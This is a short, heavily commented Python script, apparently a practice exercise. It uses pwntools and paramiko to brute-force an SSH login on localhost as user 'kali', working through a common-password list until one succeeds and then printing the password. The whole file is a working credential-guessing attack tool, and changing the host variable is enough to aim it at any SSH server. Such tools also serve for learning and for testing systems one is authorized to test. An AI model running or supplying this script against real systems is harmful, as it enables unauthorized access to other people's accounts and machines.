#import pwn and paramiko modules
from pwn import *
import paramiko

#define the IP of the host
host = "127.0.0.1"
#define the username for the ssh
username = "kali"
#initalize the attempts counter
attempts = 0

with open("ssh-common-passwords.txt", "r") as password_list:
    #go through the passwords in the password file
    for password in password_list:
        #remove the newline from each password
        password = password.strip("\n")
        try:
            #list the attempt number and the password that is currently being tried
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            #try to connect via ssh
            response = ssh(host=host, user=username, password=password, timeout=1)
            #if we get an authenticated connection
            if response.connected():
                #print the valid password
                print("[>] Valid password found: '{}'!".format(password))
                #close the connection
                response.close()
                #break out of the for loop
                break
            #close the connection if the password is not correct
            response.close()
        #catch the authentication exception
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password")
        #increase the number of attempts
        attempts += 1